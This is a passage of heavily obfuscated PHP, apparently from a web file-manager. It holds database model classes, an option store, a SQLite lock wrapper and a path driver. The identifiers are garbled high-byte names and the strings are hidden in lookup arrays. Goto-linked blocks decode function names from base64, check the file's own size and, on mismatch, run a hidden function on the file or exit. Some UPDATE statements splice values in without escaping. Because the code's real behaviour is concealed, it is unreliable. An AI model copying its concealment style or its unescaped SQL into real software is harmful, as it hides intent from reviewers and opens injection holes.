array_unshift($®š¤×, $³ı¨ÍÖâ[$í¿à¢ŞÔ]); } if ($‰•Äà„Ù[321] == $•ÅÍíØ[3]) { $³ı¨ÍÖâ[$í¿à¢ŞÔ] = call_user_func_array($˜ûËŸáµ, $®š¤×); } else { $³ı¨ÍÖâ[$í¿à¢ŞÔ] = call_user_func_array(array(&$this, $˜ûËŸáµ), $®š¤×); } break; case $‰•Äà„Ù[270]: if (isset($³ı¨ÍÖâ[$í¿à¢ŞÔ]) && $³ı¨ÍÖâ[$í¿à¢ŞÔ]) { $³ı¨ÍÖâ[$í¿à¢ŞÔ] = call_user_func_array(array(&$this, $•ÅÍíØ[1]), array($³ı¨ÍÖâ[$í¿à¢ŞÔ])); } break; case $‰•Äà„Ù[273]: $³ı¨ÍÖâ[$í¿à¢ŞÔ] = $³ı¨ÍÖâ[$•ÅÍíØ[1]]; break; case $‰•Äà„Ù[294]: if (isset($³ı¨ÍÖâ[$í¿à¢ŞÔ]) && !is_string($³ı¨ÍÖâ[$í¿à¢ŞÔ])) { $³ı¨ÍÖâ[$í¿à¢ŞÔ] = json_encode_force($³ı¨ÍÖâ[$í¿à¢ŞÔ]); } break; case $‰•Äà„Ù[323]: if ($³ı¨ÍÖâ[$í¿à¢ŞÔ] === $‰•Äà„Ù[12]) { unset($³ı¨ÍÖâ[$í¿à¢ŞÔ]); } break; case $‰•Äà„Ù[324]: $³ı¨ÍÖâ[$í¿à¢ŞÔ] = $•ÅÍíØ[1]; default: break; } } if ($½ òÍˆ == $‰•Äà„Ù[355]) { $•î½±¬¦ = strtolower($this->db->getDbType()); if (strpos($•î½±¬¦, $‰•Äà„Ù[13]) !== 0) { return; } $íëÜ¤éÜ = $this->field(!0)->fields; $Æ˜‘îÔ° = $íëÜ¤éÜ[$‰•Äà„Ù[252]]; if (isset($íëÜ¤éÜ[$‰•Äà„Ù[251]])) { unset($Æ˜‘îÔ°[$íëÜ¤éÜ[$‰•Äà„Ù[251]]]); } foreach ($Æ˜‘îÔ° as $ì• ã•× => $½ òÍˆ) { if (!isset($³ı¨ÍÖâ[$ì• ã•×])) { $³ı¨ÍÖâ[$ì• ã•×] = $‰•Äà„Ù[12]; } } } } private function dataAfterFilter(&$Õ·ÓöÁ) { $—¤ªµœŸ =& $_SERVER[³·—™¤¢]; foreach ($this->dataAuto as $ó¿—¼´›) { $œ£áĞâõ = $ó¿—¼´›[0]; if (!isset($Õ·ÓöÁ[$œ£áĞâõ])) { continue; } if (!in_array($—¤ªµœŸ[357], explode($—¤ªµœŸ[50], $ó¿—¼´›[2]))) { continue; } switch (trim($ó¿—¼´›[3])) { case $—¤ªµœŸ[321]: case $—¤ªµœŸ[322]: $…ÕıøÒ— = isset($ó¿—¼´›[4]) ? (array) $ó¿—¼´›[4] : array(); array_unshift($…ÕıøÒ—, $Õ·ÓöÁ[$œ£áĞâõ]); if (isset($ó¿—¼´›[4]) && $ó¿—¼´›[4] == $—¤ªµœŸ[377]) { $…ÕıøÒ— = array($Õ·ÓöÁ[$œ£áĞâõ]); } if ($—¤ªµœŸ[321] == $ó¿—¼´›[3]) { $Õ·ÓöÁ[$œ£áĞâõ] = call_user_func_array($ó¿—¼´›[1], $…ÕıøÒ—); } else { $Õ·ÓöÁ[$œ£áĞâõ] = call_user_func_array(array(&$this, $ó¿—¼´›[1]), $…ÕıøÒ—); } break; case $—¤ªµœŸ[270]: if (isset($Õ·ÓöÁ[$œ£áĞâõ]) && $Õ·ÓöÁ[$œ£áĞâõ]) { $Õ·ÓöÁ[$œ£áĞâõ] = call_user_func_array(array(&$this, $ó¿—¼´›[1]), array($Õ·ÓöÁ[$œ£áĞâõ])); } break; case $—¤ªµœŸ[273]: $Õ·ÓöÁ[$œ£áĞâõ] = $Õ·ÓöÁ[$ó¿—¼´›[1]]; break; case $—¤ªµœŸ[294]: $‚ì öõœ = $Õ·ÓöÁ[$œ£áĞâõ]; $Õ·ÓöÁ[$œ£áĞâõ] = json_decode($‚ì öõœ, !0); if (is_null($Õ·ÓöÁ[$œ£áĞâõ])) { $Õ·ÓöÁ[$œ£áĞâõ] = $‚ì öõœ; } break; case $—¤ªµœŸ[323]: if ($Õ·ÓöÁ[$œ£áĞâõ] === $—¤ªµœŸ[12]) { unset($Õ·ÓöÁ[$œ£áĞâõ]); } break; case $—¤ªµœŸ[324]: $Õ·ÓöÁ[$œ£áĞâõ] = $ó¿—¼´›[1]; break; default: break; } } } public function saveAll($ü¿ÔìÏç) { $ÆìÈ²—ë =& $_SERVER[³·—™¤¢]; $ù¡„ƒ‚ = $this->tablePrefix . $this->tableName; $éß§Ú†‚ = self::SQL_WHERE_IN_CHUNK; $ü¿ÔìÏç = is_array($ü¿ÔìÏç) ? $ü¿ÔìÏç : array(); $ñ‘“¯‡å = $ÆìÈ²—ë[378]; $ê÷Ô¨— = 0; $Ê“¼æíÌ = array(); $‚åÕ¬  = count($ü¿ÔìÏç); for ($¾Ş°ëã = 0; $¾Ş°ëã < $‚åÕ¬ ; $¾Ş°ëã++) { $•œóØâ = $ü¿ÔìÏç[$¾Ş°ëã]; if (!is_array($•œóØâ) || count($•œóØâ) != 4) { continue; } $¤ñ³´ = "\x55\x50\104\x41\x54\105\40\140{$ù¡„ƒ‚}\x60\x20\123\105\124\40{$•œóØâ[2]}\x20\x3d\40\103\101\x53\x45\40{$•œóØâ[0]}\x20\xa"; if ($ê÷Ô¨— == 0) { $ñ‘“¯‡å = $¤ñ³´; } $Ê“¼æíÌ[] = $ÆìÈ²—ë[118] . $•œóØâ[1] . $ÆìÈ²—ë[118]; $ê÷Ô¨—++; $ñ‘“¯‡å .= "\40\127\110\105\116\40\x27{$•œóØâ[1]}\x27\x20\x54\110\105\x4e\x20\47{$•œóØâ[3]}\47\40\12"; if ($ê÷Ô¨— == $éß§Ú†‚ || $¾Ş°ëã == $‚åÕ¬  - 1) { $ ‚·†‹ï = implode($ÆìÈ²—ë[50], $Ê“¼æíÌ); $ñ‘“¯‡å .= "\x20\105\x4e\x44\40\x20\127\110\105\122\105\x20{$•œóØâ[0]}\x20\x49\x4e\x20\50{$ ‚·†‹ï}\x29\40"; $this->execute($ñ‘“¯‡å); $ê÷Ô¨— = 0; $ñ‘“¯‡å = $¤ñ³´; $this->chunkEventCheck(count($Ê“¼æíÌ)); $Ê“¼æíÌ = array(); } } $this->chunkEventSet(); } public function saveAllEach($õ¸…‘½º) { $›€¼˜ ­ =& $_SERVER[³·—™¤¢]; $£„ÍÉñç = $this->tablePrefix . $this->tableName; foreach ($õ¸…‘½º as $‹ö†’ÊË) { if (!is_array($‹ö†’ÊË) || count($‹ö†’ÊË) != 4) { continue; } $®Ë şû = $‹ö†’ÊË[0] . $›€¼˜ ­[379] . $‹ö†’ÊË[1] . $›€¼˜ ­[118]; $îÊÂŒèÓ = $‹ö†’ÊË[2] . $›€¼˜ ­[379] . $‹ö†’ÊË[3] . $›€¼˜ ­[118]; $ò–ŞâÚà = "\x75\x70\x64\141\x74\x65\40{$£„ÍÉñç}\40\x73\145\164\40{$îÊÂŒèÓ}\40\167\x68\x65\162\x65\40{$®Ë şû}\73"; $this->execute($ò–ŞâÚà); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($·³Í‘Ü» = false, $ª×õ²â» = false) { $this->_chunkEvent = $·³Í‘Ü»; $this->_chunkEventParam = $ª×õ²â»; } private function chunkEventCheck($«Á«ñ­İ) { if (!$this->_chunkEvent) { return; } $É„§¥« = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $É„§¥«[$_SERVER[³·—™¤¢][380]] = $«Á«ñ­İ; Hook::trigger($this->_chunkEvent, $É„§¥«); } public function addAll($ÔíôİÙ™, $–Ş·ÂÇì = array(), $ô³×²… = false) { $¬‚áºšŞ =& $_SERVER[³·—™¤¢]; ignore_timeout(); $àÌĞ’ = self::SQL_WHERE_IN_CHUNK; if (empty($ÔíôİÙ™)) { $this->error = think_lang($¬‚áºšŞ[271]); return !1; } $–Ş·ÂÇì = $this->_parseOptions($–Ş·ÂÇì); foreach ($ÔíôİÙ™ as $°õË¾Îà => $åÃ§ë æ) { $ÔíôİÙ™[$°õË¾Îà] = $this->_facade($åÃ§ë æ); $this->_beforeInsert($ÔíôİÙ™[$°õË¾Îà], $–Ş·ÂÇì); } if (method_exists($this->db, $¬‚áºšŞ[272])) { for ($À¢¥´ê£ = 0; $À¢¥´ê£ < count($ÔíôİÙ™); $À¢¥´ê£ += $àÌĞ’) { $Ü¦ÈÑÆ = array_slice($ÔíôİÙ™, $À¢¥´ê£, $àÌĞ’); if (!is_array($Ü¦ÈÑÆ) || count($Ü¦ÈÑÆ) == 0) { break; } $±¤å« = $this->db->insertAll($Ü¦ÈÑÆ, $–Ş·ÂÇì, $ô³×²…); $this->chunkEventCheck(count($Ü¦ÈÑÆ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÔíôİÙ™ as $°õË¾Îà => $åÃ§ë æ) { $±¤å« = $this->db->insert($åÃ§ë æ, $–Ş·ÂÇì, $ô³×²…); } $this->commit(); } if (!1 !== $±¤å«) { $½¿÷Ü = $this->getLastInsID(); if ($½¿÷Ü) { return $½¿÷Ü; } } return $±¤å«; } public function save($ïŸäØµõ = '', $óãÁÜ¤ = array()) { $¡³æÊÜê =& $_SERVER[³·—™¤¢]; $¹ÎÅ½œš = self::SQL_WHERE_IN_CHUNK; $ö–³íÀ = $this->optionsValue(); $‡°„•ùğ = $this->findWhereField($ö–³íÀ); if (!$‡°„•ùğ) { return parent::save($ïŸäØµõ, $óãÁÜ¤); } $Ó¹Ø’Ÿş = 0; $ÂÔĞìÁˆ = $ö–³íÀ[$¡³æÊÜê[275]][$‡°„•ùğ][1]; $ÂÔĞìÁˆ = is_array($ÂÔĞìÁˆ) ? $ÂÔĞìÁˆ : array(); $á‹­ò˜– = count($ÂÔĞìÁˆ); for ($àÂíÆ·Ş = 0; $àÂíÆ·Ş < $á‹­ò˜–; $àÂíÆ·Ş += $¹ÎÅ½œš) { $Ğ¢™ØĞ  = array_slice($ÂÔĞìÁˆ, $àÂíÆ·Ş, $¹ÎÅ½œš); if (!is_array($Ğ¢™ØĞ ) || count($Ğ¢™ØĞ ) == 0) { break; } $ö–³íÀ[$¡³æÊÜê[275]][$‡°„•ùğ][1] = $Ğ¢™ØĞ ; $this->optionsValue($ö–³íÀ); $Ó¹Ø’Ÿş += parent::save($ïŸäØµõ, $óãÁÜ¤); $this->chunkEventCheck(count($Ğ¢™ØĞ )); } $this->chunkEventSet(); return $Ó¹Ø’Ÿş; } public function add($ùÏñè•æ = '', $’òíî« = array(), $™Ü¸à  = false) { if ($this->addTaskStatus && is_array($ùÏñè•æ)) { $this->addTaskData[] = $ùÏñè•æ; return; } return parent::add($ùÏñè•æ, $’òíî«, $™Ü¸à ); } public function parseWhereLike($³®«ÅˆŠ, $ò¥Î“ú = '', $Ş³ö˜µÈ = false, &$´äÕúß¿ = false) { $ø¾¢şÄõ =& $_SERVER[³·—™¤¢]; $¯ùêá³ = $GLOBALS[$ø¾¢şÄõ[6]][$ø¾¢şÄõ[381]]; if (!$¯ùêá³[$ø¾¢şÄõ[382]]) { return $³®«ÅˆŠ; } if (!is_array($³®«ÅˆŠ)) { return $³®«ÅˆŠ; } $Ü¤†Ù€£ = array(); $ß²ÌÊœï = 0; foreach ($³®«ÅˆŠ as $Ó±ÚñÕî => $×šóó§») { if (is_array($×šóó§») && count($×šóó§») == 2 && $×šóó§»[0] == $ø¾¢şÄõ[383] && is_string($×šóó§»[1]) && substr($×šóó§»[1], 0, 1) == $ø¾¢şÄõ[384] && substr($×šóó§»[1], strlen($×šóó§»[1]) - 1, 1) == $ø¾¢şÄõ[384]) { $´äÕúß¿ = !0; $£¥ı±µû = is_string($Ó±ÚñÕî) ? $Ó±ÚñÕî : $ò¥Î“ú; $¶ƒ·¤Â¡ = substr($×šóó§»[1], 1, strlen($×šóó§»[1]) - 2); $¶ƒ·¤Â¡ = $this->db->escapeString($¶ƒ·¤Â¡); if (!strpos($£¥ı±µû, $ø¾¢şÄõ[10])) { $£¥ı±µû = $ø¾¢şÄõ[385] . $£¥ı±µû . $ø¾¢şÄõ[385]; } $òÛß’ç = $ø¾¢şÄõ[188] . $¶ƒ·¤Â¡ . $ø¾¢şÄõ[188]; $¶ƒ·¤Â¡ = str_replace(array($ø¾¢şÄõ[10], $ø¾¢şÄõ[386], $ø¾¢şÄõ[11]), $ø¾¢şÄõ[387], $¶ƒ·¤Â¡); if ($¯ùêá³[$ø¾¢şÄõ[388]]) { $òÛß’ç = $ø¾¢şÄõ[389] . $¶ƒ·¤Â¡ . $ø¾¢şÄõ[390]; if ($¯ùêá³[$ø¾¢şÄõ[391]]) { $òÛß’ç = $ø¾¢şÄõ[390] . $¶ƒ·¤Â¡ . $ø¾¢şÄõ[389]; } } $Ü¤†Ù€£[$ß²ÌÊœï] = $ø¾¢şÄõ[392] . $£¥ı±µû . $ø¾¢şÄõ[393] . $òÛß’ç . $ø¾¢şÄõ[394]; $ß²ÌÊœï++; continue; } if (is_array($×šóó§»)) { $ò¥Î“ú = is_string($Ó±ÚñÕî) ? $Ó±ÚñÕî : $ò¥Î“ú; $×šóó§» = $this->parseWhereLike($×šóó§», $ò¥Î“ú, !0, $´äÕúß¿); } if (is_numeric($Ó±ÚñÕî)) { $Ü¤†Ù€£[$ß²ÌÊœï] = $×šóó§»; $ß²ÌÊœï++; } else { $Ü¤†Ù€£[$Ó±ÚñÕî] = $×šóó§»; } } if ($´äÕúß¿ && !$Ş³ö˜µÈ) { } return $Ü¤†Ù€£; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($šØæ×®ï = array()) { $¹ñúÑİĞ =& $_SERVER[³·—™¤¢]; $‚óŒÁ®ñ = self::SQL_WHERE_IN_CHUNK; $”¯è–ûã = $this->optionsValue(); $ë¬›İ… = $this->findWhereField($”¯è–ûã); if (!$ë¬›İ… || isset($”¯è–ûã[$¹ñúÑİĞ[292]]) || isset($”¯è–ûã[$¹ñúÑİĞ[353]])) { return parent::select($šØæ×®ï); } $“àŞìşÓ = $”¯è–ûã[$¹ñúÑİĞ[275]][$ë¬›İ…][1]; $“àŞìşÓ = is_array($“àŞìşÓ) ? $“àŞìşÓ : array(); $ğ¶ÕÎ¤û = null; for ($×Åœ«¹œ = 0; $×Åœ«¹œ < count($“àŞìşÓ); $×Åœ«¹œ += $‚óŒÁ®ñ) { $Ö¸ËûÃ’ = array_slice($“àŞìşÓ, $×Åœ«¹œ, $‚óŒÁ®ñ); if (!is_array($Ö¸ËûÃ’) || count($Ö¸ËûÃ’) == 0) { break; } $”¯è–ûã[$¹ñúÑİĞ[275]][$ë¬›İ…][1] = $Ö¸ËûÃ’; $this->optionsValue($”¯è–ûã); $Ü§¦â÷Â = parent::select($šØæ×®ï); if (!$Ü§¦â÷Â) { continue; } $ğ¶ÕÎ¤û = is_array($ğ¶ÕÎ¤û) ? $ğ¶ÕÎ¤û : array(); $ğ¶ÕÎ¤û = array_merge($ğ¶ÕÎ¤û, $Ü§¦â÷Â); } return $ğ¶ÕÎ¤û; } public function delete($ ä‹ÖÑ‘ = array()) { $»€‚ÆŒó =& $_SERVER[³·—™¤¢]; $üîşêì = self::SQL_WHERE_IN_CHUNK; $İµ¿¿›´ = $this->optionsValue(); $¶ĞÓÆ¸ = $this->findWhereField($İµ¿¿›´); if (!$¶ĞÓÆ¸) { return parent::delete($ ä‹ÖÑ‘); } $“áæ±Œß = 0; $Ó¯—‘Ô® = $İµ¿¿›´[$»€‚ÆŒó[275]][$¶ĞÓÆ¸][1]; $Ó¯—‘Ô® = is_array($Ó¯—‘Ô®) ? $Ó¯—‘Ô® : array(); for ($öÜÍ”ü = 0; $öÜÍ”ü < count($Ó¯—‘Ô®); $öÜÍ”ü += $üîşêì) { $ë¤¯«’Ì = array_slice($Ó¯—‘Ô®, $öÜÍ”ü, $üîşêì); if (!is_array($ë¤¯«’Ì) || count($ë¤¯«’Ì) == 0) { break; } $İµ¿¿›´[$»€‚ÆŒó[275]][$¶ĞÓÆ¸][1] = $ë¤¯«’Ì; $this->optionsValue($İµ¿¿›´); $“áæ±Œß += parent::delete($ ä‹ÖÑ‘); } return $“áæ±Œß; } private function findWhereField($«ùËüÔù) { $ç£ÊĞº =& $_SERVER[³·—™¤¢]; $£ÓË¦ğ = self::SQL_WHERE_IN_CHUNK; if (!is_array($«ùËüÔù) || !is_array($«ùËüÔù[$ç£ÊĞº[275]])) { return !1; } foreach ($«ùËüÔù[$ç£ÊĞº[275]] as $‰ÆŞ…â– => $ÆÕñË¹â) { if (is_array($ÆÕñË¹â) && isset($ÆÕñË¹â[0]) && is_string($ÆÕñË¹â[0]) && strtolower($ÆÕñË¹â[0]) == $ç£ÊĞº[7] && is_array($ÆÕñË¹â[1]) && count($ÆÕñË¹â[1]) > $£ÓË¦ğ) { ignore_timeout(); return $‰ÆŞ…â–; } } return !1; } public function setMasterDB($™ÍˆÜùç = true) { think_config($_SERVER[³·—™¤¢][395], $™ÍˆÜùç); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\145\x6d\x4f\160\164\x69\x6f\156"; public $field = array(); public function listData($›Ê´Šıô = false, $¸ŒáµÄü = "\155\x6f\x64\151\x66\171\x54\151\x6d\x65", $ÒœòÃ÷ = false) { $Ã¯¸ĞÑ€ = Model($this->modelType)->get(!1, $this->optionType, !0); $•§›áø = array_values($Ã¯¸ĞÑ€); if ($•§›áø && $•§›áø[0] && !is_array($•§›áø[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Ã¯¸ĞÑ€ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Ã¯¸ĞÑ€) { return $›Ê´Šıô ? null : array(); } if (!$›Ê´Šıô) { $Ã¯¸ĞÑ€ = array_filter(array_values($Ã¯¸ĞÑ€)); return array_sort_by($Ã¯¸ĞÑ€, $¸ŒáµÄü, $ÒœòÃ÷); } return $Ã¯¸ĞÑ€[$_SERVER[³·—™¤¢][396] . $›Ê´Šıô]; } public function insert($ÆŞ¿›Êğ) { $ùìí‹î =& $_SERVER[³·—™¤¢]; $ÆŞ¿›Êğ = array_field_key($ÆŞ¿›Êğ, $this->field); $œãÍ² = Model($this->modelType)->get($ùìí‹î[397], $this->optionType . $ùìí‹î[398]); $œãÍ² = $œãÍ² ? $œãÍ² : 0; $ÆŞ¿›Êğ[$ùìí‹î[399]] = ++$œãÍ²; $ÆŞ¿›Êğ[$ùìí‹î[200]] = time(); $ÆŞ¿›Êğ[$ùìí‹î[85]] = time(); Model($this->modelType)->set($ùìí‹î[397], $œãÍ², $this->optionType . $ùìí‹î[398]); Model($this->modelType)->set($ùìí‹î[396] . $œãÍ², $ÆŞ¿›Êğ, $this->optionType); return $œãÍ²; } public function update($±¼çËÒ‹, $Ş¡Ã”àÑ) { $ÁÃÜÆÉÚ =& $_SERVER[³·—™¤¢]; $Ş¡Ã”àÑ = array_field_key($Ş¡Ã”àÑ, $this->field); $‰ÒÒä®» = $this->listData($±¼çËÒ‹); if (!$‰ÒÒä®» || !$±¼çËÒ‹) { return !1; } $Ş¡Ã”àÑ = array_merge($‰ÒÒä®», $Ş¡Ã”àÑ); $Ş¡Ã”àÑ[$ÁÃÜÆÉÚ[85]] = time(); return Model($this->modelType)->set($ÁÃÜÆÉÚ[396] . $±¼çËÒ‹, $Ş¡Ã”àÑ, $this->optionType); } public function remove($ÑïÀ¨êù) { if (!$ÑïÀ¨êù) { return !1; } return Model($this->modelType)->remove($_SERVER[³·—™¤¢][396] . $ÑïÀ¨êù, $this->optionType); } public function clear() { $®‹ë±œè =& $_SERVER[³·—™¤¢]; Model($this->modelType)->remove($®‹ë±œè[397], $this->optionType . $®‹ë±œè[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ıãşé¸ˆ, $€ŒšÀô³) { if (!$€ŒšÀô³) { return !1; } $½ÁÃß¨µ = $this->listData(); $½ÁÃß¨µ = array_to_keyvalue($½ÁÃß¨µ, $ıãşé¸ˆ); return isset($½ÁÃß¨µ[$€ŒšÀô³]) ? $½ÁÃß¨µ[$€ŒšÀô³] : !1; } public function findByName($ÜÊÉ±¢È) { return $this->findByKey($_SERVER[³·—™¤¢][32], $ÜÊÉ±¢È); } protected function resetData($øçªµı) { $©ƒ·Î©± =& $_SERVER[³·—™¤¢]; $øçªµı = is_array($øçªµı) ? $øçªµı : array(); $‰ã¬ÒŠ¨ = array(); for ($¦’òÍ•” = 0; $¦’òÍ•” < count($øçªµı); $¦’òÍ•”++) { $‰ã¬ÒŠ¨[$©ƒ·Î©±[396] . $øçªµı[$¦’òÍ•”][$©ƒ·Î©±[399]]] = $øçªµı[$¦’òÍ•”]; } return Model($this->modelType)->set($‰ã¬ÒŠ¨, !1, $this->optionType); } private function getAutoName($–„ß¤Š) { $Ïæ”Íğî = array_to_keyvalue($this->listData(), $_SERVER[³·—™¤¢][32]); if (!$Ïæ”Íğî || !isset($Ïæ”Íğî[$–„ß¤Š])) { return $–„ß¤Š; } for ($€ş‹³Ê– = 1; $€ş‹³Ê– < count($Ïæ”Íğî); $€ş‹³Ê–++) { $şˆ¸‰’¿ = $–„ß¤Š . "\50{$€ş‹³Ê–}\x29"; if (!isset($Ïæ”Íğî[$şˆ¸‰’¿])) { return $şˆ¸‰’¿; } } return $şˆ¸‰’¿; } } goto F˜¼©ãåÖâ; Bƒ¶ÇÂâ”à: $fileSize = strrev(base64_decode($_SERVER[¯”ıî’ß][0])); function binCheckNeq($®œëø¾¨, $ÇÏ‚‰â) { return $®œëø¾¨ != $ÇÏ‚‰â; } $_SERVER[$_SERVER[¯”ıî’ß][1]] = $fileSize($_SERVER[$_SERVER[¯”ıî’ß][2]]); goto BÜ©ª¾å‘Ø; e£á“ƒä²Í: $_size = $_SERVER[³·—™¤¢][982]; if ($_SERVER[$_SERVER[³·—™¤¢][892]] != $_size($_file)) { $_getc = $_SERVER[³·—™¤¢][895]; $_getfile = $_SERVER[$_SERVER[³·—™¤¢][896]] . $_SERVER[³·—™¤¢][897]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³·—™¤¢][231], $_getfilec); if (count($_getarrs) < $_SERVER[³·—™¤¢][632]) { $exit = $_SERVER[³·—™¤¢][898]; $exit(); } $_act = $_SERVER[³·—™¤¢][935]; $_act($_file); } class DbSqlite extends DbSqliteBase { public function query($çı·ïùş) { $ûÇÀè‹™ =& $_SERVER[³·—™¤¢]; if (!CacheLock::fileLock($ûÇÀè‹™[13])) { return !1; } $ÅŞú³Ã¤ = parent::query($çı·ïùş); CacheLock::fileUnLock($ûÇÀè‹™[13]); return $ÅŞú³Ã¤; } public function execute($ Åê¤âí) { $¥Ó“ìí¨ =& $_SERVER[³·—™¤¢]; if (!CacheLock::fileLock($¥Ó“ìí¨[13])) { return !1; } $ÆÅğî×Ù = parent::execute($ Åê¤âí); CacheLock::fileUnLock($¥Ó“ìí¨[13]); return $ÆÅğî×Ù; } } goto FÃ—Œ·çôŠ; bµà’ŸÉØ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Çà‹Õ¥“) { $this->pathParse = $Çà‹Õ¥“; $this->model = Model($_SERVER[³·—™¤¢][1350]); } public function getPath($·¹œíÈ) { return trim($·¹œíÈ, $_SERVER[³·—™¤¢][8]); } public function pathFather($ÇÁËÍ‘ƒ) { $¤ı£Ê‚Û = $this->parse($ÇÁËÍ‘ƒ); $¤ı£Ê‚Û = $this->infoSimple($ÇÁËÍ‘ƒ); return $¤ı£Ê‚Û ? $¤ı£Ê‚Û[$_SERVER[³·—™¤¢][432]] : !1; } public function pathThis($ôÉ»Åéœ) { $µÇğû¢É = $this->infoSimple($ôÉ»Åéœ); return $µÇğû¢É ? $µÇğû¢É[$_SERVER[³·—™¤¢][32]] : !1; } public function getPathOuter($Ê•Êã’é) { if (!$Ê•Êã’é) { return $Ê•Êã’é; } $ºü•¦ò® = $this->parse($Ê•Êã’é); return KodIO::make($ºü•¦ò®[$_SERVER[³·—™¤¢][399]]); } public function copyFolderFromIO($å÷ĞÏƒë, $ºİ´–æÓ, $‹¦€Ô„ƒ, $Å³÷ïÅö, $ÖÏƒŞì) { $¶²—˜· = $this->model->copyFolderFromIO($å÷ĞÏƒë, $ºİ´–æÓ, $‹¦€Ô„ƒ, $Å³÷ïÅö, $ÖÏƒŞì); return KodIO::make($¶²—˜·); } public function isParentOf($Íê±­Ç², $‹´ş“«Í) { return $this->model->isParentOf($Íê±­Ç², $‹´ş“«Í); } public function mkfile($²Ÿ£‹¶‘, $·Ÿ…é¨† = '', $ ¥ğÓÊ… = REPEAT_RENAME) { $ˆ¶üÆò =& $_SERVER[³·—™¤¢]; $»­’ñğ¤ = $this->parse($²Ÿ£‹¶‘); $²Ÿ£‹¶‘ = $»­’ñğ¤[$ˆ¶üÆò[399]]; for ($µæø˜‚å = 0; $µæø˜‚å < count($»­’ñğ¤[$ˆ¶üÆò[1351]]); $µæø˜‚å++) { $ÖÕäó¡ = $»­’ñğ¤[$ˆ¶üÆò[1351]][$µæø˜‚å]; if ($µæø˜‚å == count($»­’ñğ¤[$ˆ¶üÆò[1351]]) - 1) { $²Ÿ£‹¶‘ = $this->model->mkfile($²Ÿ£‹¶‘, $ÖÕäó¡, $·Ÿ…é¨†, $ ¥ğÓÊ…); break; } $²Ÿ£‹¶‘ = $this->model->mkdir($²Ÿ£‹¶‘, $ÖÕäó¡, REPEAT_SKIP); } return $this->getPathOuter($²Ÿ£‹¶‘); } public function mkdir($‘óİ´ì°, $–š÷º¤¯ = REPEAT_SKIP) { $šå–¡Ø =& $_SERVER[³·—™¤¢]; $•å‚ÙÁÚ = $this->parse($‘óİ´ì°); $‘óİ´ì° = $•å‚ÙÁÚ[$šå–¡Ø[399]]; for ($ß¹–®± = 0; $ß¹–®± < count($•å‚ÙÁÚ[$šå–¡Ø[1351]]); $ß¹–®±++) { $±–Ÿ–áš = $•å‚ÙÁÚ[$šå–¡Ø[1351]][$ß¹–®±]; $‘óİ´ì° = $this->model->mkdir($‘óİ´ì°, $±–Ÿ–áš, $–š÷º¤¯); } return $this->getPathOuter($‘óİ´ì°); } public function copyFile($Öš¼¤ÊÊ, $ø±íóÁÒ, $ú–Èñı‹ = REPEAT_REPLACE) { $šÁÁ¶¢½ =& $_SERVER[³·—™¤¢]; $ë–ª¬Úœ = $this->parse($ø±íóÁÒ); $…èå¥º = $this->model->copy($Öš¼¤ÊÊ, $ë–ª¬Úœ[$šÁÁ¶¢½[399]], $ú–Èñı‹, $ë–ª¬Úœ[$šÁÁ¶¢½[84]]); return $…èå¥º ? $this->getPathOuter($…èå¥º) : !1; } public function moveFile($“Ñú±İõ, $¤¡û¢•Â, $ë·¹×®Á = REPEAT_REPLACE) { $¯ÖÅÑË =& $_SERVER[³·—™¤¢]; $…úÆ« = $this->parse($¤¡û¢•Â); $…â‘À¹º = $this->model->move($“Ñú±İõ, $…úÆ«[$¯ÖÅÑË[399]], $ë·¹×®Á, $…úÆ«[$¯ÖÅÑË[84]]); return $…â‘À¹º ? $this->getPathOuter($…â‘À¹º) : !1; } public function copy($ûÏÊ‚–, $“ÆÜÍ’, $İ«æåş = REPEAT_REPLACE, $Ï¶ÇÜÕÛ = false) { $°•¸ˆ†Ğ = $this->parse($“ÆÜÍ’); $¼ÑÚœœç = $this->model->copy($ûÏÊ‚–, $°•¸ˆ†Ğ[$_SERVER[³·—™¤¢][399]], $İ«æåş, $Ï¶ÇÜÕÛ); return $¼ÑÚœœç ? $this->getPathOuter($¼ÑÚœœç) : !1; } public function moveSameAllow() { } public function move($¢¢šâ„á, $ÛÓÛŸ¾Î, $¤şõì… = REPEAT_REPLACE, $ß«¿µ­œ = false) { $ÎÉÆ²Ì¾ = $this->parse($ÛÓÛŸ¾Î); $˜˜„¡Ëƒ = $this->model->move($¢¢šâ„á, $ÎÉÆ²Ì¾[$_SERVER[³·—™¤¢][399]], $¤şõì…, $ß«¿µ­œ); return $˜˜„¡Ëƒ ? $this->getPathOuter($˜˜„¡Ëƒ) : !1; } public function remove($©Ú »¼ö, $ôş˜²²Æ = true) { return $this->model->remove($©Ú »¼ö, $ôş˜²²Æ); } public function rename($ı‘‡Ç¾ƒ, $¥©ûş İ) { $˜•º§Ö = $this->model->rename($ı‘‡Ç¾ƒ, $¥©ûş İ); return $˜•º§Ö ? $this->getPathOuter($ı‘‡Ç¾ƒ) : $˜•º§Ö; } public function size($ÑÛØÄÁŞ) { $¡ÊÙØ¡Ì = $this->infoSimple($ÑÛØÄÁŞ); return $¡ÊÙØ¡Ì ? $¡ÊÙØ¡Ì[$_SERVER[³·—™¤¢][76]] : 0; } public function infoSimple($ù€»£Ë¥) { return $this->model->sourceInfo($ù€»£Ë¥); } public function info($â˜èÉ¨ğ) { return $this->infoParse($â˜èÉ¨ğ); } public function infoAuth($çŒ×å½) { return $this->infoParse($çŒ×å½, !1, !0); } public function infoWithChildren($«›ÏºÙ) { return $this->infoParse($«›ÏºÙ, !0); } protected function infoParse($€Œò£…¹, $ù±²İÛë = false, $²´šÎÚÕ = false) { if (!$ù±²İÛë) { return $this->model->pathInfo($€Œò£…¹, $²´šÎÚÕ); } return $this->model->pathInfoMore($€Œò£…¹); } public function infoFull($Ÿå†àÔù) { $Èğ•¦ŒÇ =& $_SERVER[³·—™¤¢]; $º¸ª·â´ = explode($Èğ•¦ŒÇ[8], $Ÿå†àÔù); $î· 